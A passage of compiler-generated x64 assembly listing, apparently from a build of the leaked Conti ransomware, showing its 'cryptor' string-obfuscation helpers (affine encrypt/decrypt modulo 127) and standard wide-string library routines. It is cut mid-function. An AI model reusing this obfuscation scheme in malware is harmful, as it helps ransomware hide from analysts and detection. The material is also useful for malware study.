?decrypt@?$MetaBuffer@$0CP@$0BD@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z ENDP ; MetaBuffer<47,19,std::integer_sequence<unsigned __int64,0,1,2,3> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0CP@$0BD@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0CP@$0BD@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z PROC ; MetaBuffer<47,19,std::integer_sequence<unsigned __int64,0,1,2,3> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 2f	 imul	 r8d, eax, 47		; 0000002fH
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 13	 add	 r8d, 19
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0CP@$0BD@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z ENDP ; MetaBuffer<47,19,std::integer_sequence<unsigned __int64,0,1,2,3> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0CP@$0BD@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0CP@$0BD@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEBA_NXZ PROC ; MetaBuffer<47,19,std::integer_sequence<unsigned __int64,0,1,2,3> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0CP@$0BD@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEBA_NXZ ENDP ; MetaBuffer<47,19,std::integer_sequence<unsigned __int64,0,1,2,3> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$02$09U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$02$09U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z PROC ; MetaBuffer<3,10,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 0a 00 00 00	 mov	 ecx, 10
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 2a	 imul	 r8d, ecx, 42		; 0000002aH

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$02$09U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ENDP ; MetaBuffer<3,10,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$02$09U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$02$09U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z PROC ; MetaBuffer<3,10,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 8d 40 05	 lea	 r8d, DWORD PTR [rax+5]
  00007	46 8d 04 40	 lea	 r8d, DWORD PTR [rax+r8*2]
  0000b	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$02$09U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ENDP ; MetaBuffer<3,10,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$02$09U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$02$09U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEBA_NXZ PROC ; MetaBuffer<3,10,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$02$09U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEBA_NXZ ENDP ; MetaBuffer<3,10,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GN@$0HB@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0GN@$0HB@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z PROC ; MetaBuffer<109,113,std::integer_sequence<unsigned __int64,0,1,2,3> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 71	 sub	 eax, 113		; 00000071H
  00006	44 6b c0 07	 imul	 r8d, eax, 7

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GN@$0HB@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z ENDP ; MetaBuffer<109,113,std::integer_sequence<unsigned __int64,0,1,2,3> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0GN@$0HB@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0GN@$0HB@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z PROC ; MetaBuffer<109,113,std::integer_sequence<unsigned __int64,0,1,2,3> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 6d	 imul	 r8d, eax, 109		; 0000006dH
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 71	 add	 r8d, 113		; 00000071H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0GN@$0HB@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z ENDP ; MetaBuffer<109,113,std::integer_sequence<unsigned __int64,0,1,2,3> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0GN@$0HB@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0GN@$0HB@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEBA_NXZ PROC ; MetaBuffer<109,113,std::integer_sequence<unsigned __int64,0,1,2,3> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0GN@$0HB@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEBA_NXZ ENDP ; MetaBuffer<109,113,std::integer_sequence<unsigned __int64,0,1,2,3> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Take_contents@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXAEAV12@@Z
_TEXT	SEGMENT
this$ = 8
_Right$ = 16
?_Take_contents@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXAEAV12@@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Take_contents, COMDAT

; 3053 :         // assign by stealing _Right's buffer
; 3054 :         // pre: this != &_Right
; 3055 :         // pre: allocator propagation (POCMA) from _Right, if necessary, is complete
; 3056 :         // pre: *this owns no memory, iterators orphaned
; 3057 :         // (note: _Buf/_Ptr/_Mysize/_Myres may be garbage init)
; 3058 :         auto& _My_data    = _Mypair._Myval2;
; 3059 :         auto& _Right_data = _Right._Mypair._Myval2;
; 3060 : 
; 3061 : #if !defined(_INSERT_STRING_ANNOTATION)
; 3062 :         if constexpr (_Can_memcpy_val) {
; 3063 : #if _HAS_CXX20
; 3064 :             if (!_STD is_constant_evaluated())
; 3065 : #endif // _HAS_CXX20
; 3066 :             {
; 3067 : #if _ITERATOR_DEBUG_LEVEL != 0
; 3068 :                 if (_Right_data._Large_mode_engaged()) {
; 3069 :                     // take ownership of _Right's iterators along with its buffer
; 3070 :                     _Swap_proxy_and_iterators(_Right);
; 3071 :                 } else {
; 3072 :                     _Right_data._Orphan_all();
; 3073 :                 }
; 3074 : #endif // _ITERATOR_DEBUG_LEVEL != 0
; 3075 : 
; 3076 :                 const auto _My_data_mem =
; 3077 :                     reinterpret_cast<unsigned char*>(_STD addressof(_Mypair._Myval2)) + _Memcpy_val_offset;
; 3078 :                 const auto _Right_data_mem =
; 3079 :                     reinterpret_cast<const unsigned char*>(_STD addressof(_Right._Mypair._Myval2)) + _Memcpy_val_offset;
; 3080 :                 _CSTD memcpy(_My_data_mem, _Right_data_mem, _Memcpy_val_size);

  00000	0f 10 02	 movups	 xmm0, XMMWORD PTR [rdx]

; 3081 : 
; 3082 :                 _Right_data._Mysize = 0;

  00003	33 c0		 xor	 eax, eax
  00005	0f 11 01	 movups	 XMMWORD PTR [rcx], xmm0
  00008	0f 10 4a 10	 movups	 xmm1, XMMWORD PTR [rdx+16]
  0000c	0f 11 49 10	 movups	 XMMWORD PTR [rcx+16], xmm1
  00010	48 89 42 10	 mov	 QWORD PTR [rdx+16], rax

; 3083 :                 _Right_data._Myres  = _Small_string_capacity;

  00014	48 c7 42 18 07
	00 00 00	 mov	 QWORD PTR [rdx+24], 7

; 3084 :                 _Right_data._Activate_SSO_buffer();
; 3085 :                 _Traits::assign(_Right_data._Bx._Buf[0], _Elem());

  0001c	66 89 02	 mov	 WORD PTR [rdx], ax

; 3086 :                 return;
; 3087 :             }
; 3088 :         }
; 3089 : #endif // !defined(_INSERT_STRING_ANNOTATION)
; 3090 : 
; 3091 :         if (_Right_data._Large_mode_engaged()) { // steal buffer
; 3092 :             _Swap_proxy_and_iterators(_Right);
; 3093 : 
; 3094 :             _Construct_in_place(_My_data._Bx._Ptr, _Right_data._Bx._Ptr);
; 3095 :             _Right_data._Bx._Switch_to_buf();
; 3096 :         } else { // copy small string buffer
; 3097 :             _Right_data._Orphan_all();
; 3098 : 
; 3099 :             _My_data._Activate_SSO_buffer();
; 3100 :             _Traits::copy(_My_data._Bx._Buf, _Right_data._Bx._Buf, _Right_data._Mysize + 1);
; 3101 :         }
; 3102 : 
; 3103 :         _My_data._Myres  = _Right_data._Myres;
; 3104 :         _My_data._Mysize = _Right_data._Mysize;
; 3105 : 
; 3106 :         _Right_data._Mysize = 0;
; 3107 :         _Right_data._Myres  = _Small_string_capacity;
; 3108 :         _Traits::assign(_Right_data._Bx._Buf[0], _Elem());
; 3109 :     }

  0001f	c3		 ret	 0
?_Take_contents@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXAEAV12@@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Take_contents
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ?select_on_container_copy_construction@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SA?AV?$allocator@_W@2@AEBV32@@Z
_TEXT	SEGMENT
__$ReturnUdt$ = 8
_Al$dead$ = 16
?select_on_container_copy_construction@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SA?AV?$allocator@_W@2@AEBV32@@Z PROC ; std::_Default_allocator_traits<std::allocator<wchar_t> >::select_on_container_copy_construction, COMDAT

; 745  :         return _Al;

  00000	48 8b c1	 mov	 rax, rcx

; 746  :     }

  00003	c3		 ret	 0
?select_on_container_copy_construction@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SA?AV?$allocator@_W@2@AEBV32@@Z ENDP ; std::_Default_allocator_traits<std::allocator<wchar_t> >::select_on_container_copy_construction
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Swap_proxy_and_iterators@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXAEAV12@@Z
_TEXT	SEGMENT
this$dead$ = 8
_Right$dead$ = 16
?_Swap_proxy_and_iterators@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXAEAV12@@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Swap_proxy_and_iterators, COMDAT

; 4886 :         _Mypair._Myval2._Swap_proxy_and_iterators(_Right._Mypair._Myval2);
; 4887 :     }

  00000	c2 00 00	 ret	 0
?_Swap_proxy_and_iterators@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXAEAV12@@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Swap_proxy_and_iterators
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??$?H_WU?$char_traits@_W@std@@V?$allocator@_W@1@@std@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@AEBV10@QEB_W@Z
_TEXT	SEGMENT
__$ReturnUdt$ = 80
_Left$ = 88
_Right$ = 96
??$?H_WU?$char_traits@_W@std@@V?$allocator@_W@1@@std@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@AEBV10@QEB_W@Z PROC ; std::operator+<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >, COMDAT

; 4968 :     const basic_string<_Elem, _Traits, _Alloc>& _Left, _In_z_ const _Elem* const _Right) {

$LN21:
  00000	40 53		 push	 rbx
  00002	48 83 ec 40	 sub	 rsp, 64			; 00000040H
  00006	48 8b d9	 mov	 rbx, rcx
  00009	4c 8b ca	 mov	 r9, rdx

; 4969 :     using _Size_type       = typename basic_string<_Elem, _Traits, _Alloc>::size_type;
; 4970 :     const auto _Left_size  = _Left.size();

  0000c	48 8b 4a 10	 mov	 rcx, QWORD PTR [rdx+16]

; 264  :         return _CSTD wcslen(reinterpret_cast<const wchar_t*>(_First));

  00010	48 c7 c2 ff ff
	ff ff		 mov	 rdx, -1
  00017	66 0f 1f 84 00
	00 00 00 00	 npad	 9
$LL13@operator:
  00020	48 ff c2	 inc	 rdx
  00023	66 41 83 3c 50
	00		 cmp	 WORD PTR [r8+rdx*2], 0
  00029	75 f5		 jne	 SHORT $LL13@operator

; 4971 :     const auto _Right_size = _Convert_size<_Size_type>(_Traits::length(_Right));
; 4972 :     if (_Left.max_size() - _Left_size < _Right_size) {

  0002b	48 b8 fe ff ff
	ff ff ff ff 7f	 mov	 rax, 9223372036854775806 ; 7ffffffffffffffeH
  00035	48 2b c1	 sub	 rax, rcx
  00038	48 3b c2	 cmp	 rax, rdx
  0003b	72 2a		 jb	 SHORT $LN19@operator

; 2244 :         return _Myres > _Small_string_capacity;

  0003d	49 83 79 18 07	 cmp	 QWORD PTR [r9+24], 7

; 2236 :         if (_Large_mode_engaged()) {

  00042	76 03		 jbe	 SHORT $LN9@operator

; 2237 :             _Result = _Unfancy(_Bx._Ptr);

  00044	4d 8b 09	 mov	 r9, QWORD PTR [r9]
$LN9@operator:

; 4974 :     }
; 4975 : 
; 4976 :     return {_String_constructor_concat_tag{}, _Left, _Left.c_str(), _Left_size, _Right, _Right_size};

  00047	48 89 54 24 30	 mov	 QWORD PTR [rsp+48], rdx
  0004c	4c 89 44 24 28	 mov	 QWORD PTR [rsp+40], r8
  00051	48 89 4c 24 20	 mov	 QWORD PTR [rsp+32], rcx
  00056	48 8b cb	 mov	 rcx, rbx
  00059	e8 00 00 00 00	 call	 ??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@U_String_constructor_concat_tag@1@AEBV01@QEB_W_K23@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
  0005e	48 8b c3	 mov	 rax, rbx

; 4977 : }

  00061	48 83 c4 40	 add	 rsp, 64			; 00000040H
  00065	5b		 pop	 rbx
  00066	c3		 ret	 0
$LN19@operator:

; 4973 :         _Xlen_string();

  00067	e8 00 00 00 00	 call	 ?_Xlen_string@std@@YAXXZ ; std::_Xlen_string
  0006c	cc		 int	 3
$LN17@operator:
??$?H_WU?$char_traits@_W@std@@V?$allocator@_W@1@@std@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@AEBV10@QEB_W@Z ENDP ; std::operator+<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??$?H_WU?$char_traits@_W@std@@V?$allocator@_W@1@@std@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@AEBV10@0@Z
_TEXT	SEGMENT
__$ReturnUdt$ = 80
_Left$ = 88
_Right$ = 96
??$?H_WU?$char_traits@_W@std@@V?$allocator@_W@1@@std@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@AEBV10@0@Z PROC ; std::operator+<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >, COMDAT

; 4932 :     const basic_string<_Elem, _Traits, _Alloc>& _Left, const basic_string<_Elem, _Traits, _Alloc>& _Right) {

$LN25:
  00000	40 53		 push	 rbx
  00002	48 83 ec 40	 sub	 rsp, 64			; 00000040H

; 4933 :     const auto _Left_size  = _Left.size();
; 4934 :     const auto _Right_size = _Right.size();

  00006	4d 8b 48 10	 mov	 r9, QWORD PTR [r8+16]
  0000a	48 8b d9	 mov	 rbx, rcx
  0000d	48 8b 4a 10	 mov	 rcx, QWORD PTR [rdx+16]

; 4935 :     if (_Left.max_size() - _Left_size < _Right_size) {

  00011	48 b8 fe ff ff
	ff ff ff ff 7f	 mov	 rax, 9223372036854775806 ; 7ffffffffffffffeH
  0001b	48 2b c1	 sub	 rax, rcx
  0001e	49 3b c1	 cmp	 rax, r9
  00021	72 37		 jb	 SHORT $LN23@operator

; 2244 :         return _Myres > _Small_string_capacity;

  00023	48 83 7a 18 07	 cmp	 QWORD PTR [rdx+24], 7

; 2236 :         if (_Large_mode_engaged()) {

  00028	76 03		 jbe	 SHORT $LN7@operator

; 2237 :             _Result = _Unfancy(_Bx._Ptr);

  0002a	48 8b 12	 mov	 rdx, QWORD PTR [rdx]
$LN7@operator:

; 2244 :         return _Myres > _Small_string_capacity;

  0002d	49 83 78 18 07	 cmp	 QWORD PTR [r8+24], 7

; 2236 :         if (_Large_mode_engaged()) {

  00032	76 03		 jbe	 SHORT $LN14@operator

; 2237 :             _Result = _Unfancy(_Bx._Ptr);

  00034	4d 8b 00	 mov	 r8, QWORD PTR [r8]
$LN14@operator:

; 4937 :     }
; 4938 : 
; 4939 :     return {_String_constructor_concat_tag{}, _Left, _Left.c_str(), _Left_size, _Right.c_str(), _Right_size};

  00037	4c 89 4c 24 30	 mov	 QWORD PTR [rsp+48], r9
  0003c	4c 8b ca	 mov	 r9, rdx
  0003f	4c 89 44 24 28	 mov	 QWORD PTR [rsp+40], r8
  00044	48 89 4c 24 20	 mov	 QWORD PTR [rsp+32], rcx
  00049	48 8b cb	 mov	 rcx, rbx
  0004c	e8 00 00 00 00	 call	 ??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@U_String_constructor_concat_tag@1@AEBV01@QEB_W_K23@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
  00051	48 8b c3	 mov	 rax, rbx

; 4940 : }

  00054	48 83 c4 40	 add	 rsp, 64			; 00000040H
  00058	5b		 pop	 rbx
  00059	c3		 ret	 0
$LN23@operator:

; 4936 :         _Xlen_string();

  0005a	e8 00 00 00 00	 call	 ?_Xlen_string@std@@YAXXZ ; std::_Xlen_string
  0005f	cc		 int	 3
$LN21@operator:
??$?H_WU?$char_traits@_W@std@@V?$allocator@_W@1@@std@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@AEBV10@0@Z ENDP ; std::operator+<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??$?H_WU?$char_traits@_W@std@@V?$allocator@_W@1@@std@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@$$QEAV10@AEBV10@@Z
_TEXT	SEGMENT
__$ReturnUdt$ = 64
_Left$ = 72
_Right$ = 80
??$?H_WU?$char_traits@_W@std@@V?$allocator@_W@1@@std@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@$$QEAV10@AEBV10@@Z PROC ; std::operator+<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >, COMDAT

; 4998 :     basic_string<_Elem, _Traits, _Alloc>&& _Left, const basic_string<_Elem, _Traits, _Alloc>& _Right) {

$LN41:
  00000	48 89 5c 24 18	 mov	 QWORD PTR [rsp+24], rbx
  00005	48 89 7c 24 20	 mov	 QWORD PTR [rsp+32], rdi
  0000a	41 56		 push	 r14
  0000c	48 83 ec 30	 sub	 rsp, 48			; 00000030H

; 2244 :         return _Myres > _Small_string_capacity;

  00010	49 83 78 18 07	 cmp	 QWORD PTR [r8+24], 7

; 4998 :     basic_string<_Elem, _Traits, _Alloc>&& _Left, const basic_string<_Elem, _Traits, _Alloc>& _Right) {

  00015	48 8b da	 mov	 rbx, rdx
  00018	48 8b f9	 mov	 rdi, rcx

; 2235 :         const value_type* _Result = _Bx._Buf;

  0001b	4d 8b c8	 mov	 r9, r8

; 2236 :         if (_Large_mode_engaged()) {

  0001e	76 03		 jbe	 SHORT $LN6@operator

; 2237 :             _Result = _Unfancy(_Bx._Ptr);

  00020	4d 8b 08	 mov	 r9, QWORD PTR [r8]
$LN6@operator:

; 3277 :         return append(_Right._Mypair._Myval2._Myptr(), _Right._Mypair._Myval2._Mysize);

  00023	49 8b 50 10	 mov	 rdx, QWORD PTR [r8+16]

; 3307 :         if (_Count <= _Mypair._Myval2._Myres - _Old_size) {

  00027	45 33 f6	 xor	 r14d, r14d
  0002a	4c 8b 43 18	 mov	 r8, QWORD PTR [rbx+24]
  0002e	48 8b 4b 10	 mov	 rcx, QWORD PTR [rbx+16]
  00032	49 8b c0	 mov	 rax, r8
  00035	48 2b c1	 sub	 rax, rcx
  00038	48 3b d0	 cmp	 rdx, rax
  0003b	77 3f		 ja	 SHORT $LN11@operator
  0003d	48 89 6c 24 40	 mov	 QWORD PTR [rsp+64], rbp

; 3308 :             _ASAN_STRING_MODIFY(*this, _Old_size, _Old_size + _Count);
; 3309 :             _Mypair._Myval2._Mysize = _Old_size + _Count;

  00042	48 8d 2c 11	 lea	 rbp, QWORD PTR [rcx+rdx]
  00046	48 89 74 24 48	 mov	 QWORD PTR [rsp+72], rsi

; 2226 :         value_type* _Result = _Bx._Buf;

  0004b	48 8b f3	 mov	 rsi, rbx

; 3309 :             _Mypair._Myval2._Mysize = _Old_size + _Count;

  0004e	48 89 6b 10	 mov	 QWORD PTR [rbx+16], rbp

; 2244 :         return _Myres > _Small_string_capacity;

  00052	49 83 f8 07	 cmp	 r8, 7

; 2227 :         if (_Large_mode_engaged()) {

  00056	76 03		 jbe	 SHORT $LN14@operator

; 2228 :             _Result = _Unfancy(_Bx._Ptr);

  00058	48 8b 33	 mov	 rsi, QWORD PTR [rbx]
$LN14@operator:

